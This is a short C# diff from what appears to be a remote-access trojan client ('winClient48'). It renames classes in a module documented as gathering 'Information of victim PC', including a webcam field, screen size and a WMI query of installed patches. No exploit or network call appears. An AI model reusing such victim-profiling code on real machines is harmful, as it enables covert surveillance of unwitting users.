@@ -9,14 +9,14 @@ using System.Windows.Forms;
 
 namespace winClient48
 {
-    public class FuncInfo
+    public class clsfnInfo
     {
         /// <summary>
         /// Information of victim PC
         /// </summary>
         internal class PC
         {
-            private Webcam webcam;
+            private clsfnWebcam webcam;
 
             public Size MainScreenSize()
             {
@@ -41,7 +41,7 @@ namespace winClient48
             public DataTable GetPatch()
             {
                 string szQuery = "SELECT * FROM Win32_QuickFixEngineering";
-                DataTable dt = Global.WMI_Query(szQuery);
+                DataTable dt = clsGlobal.WMI_Query(szQuery);
                 return dt;
             }
 
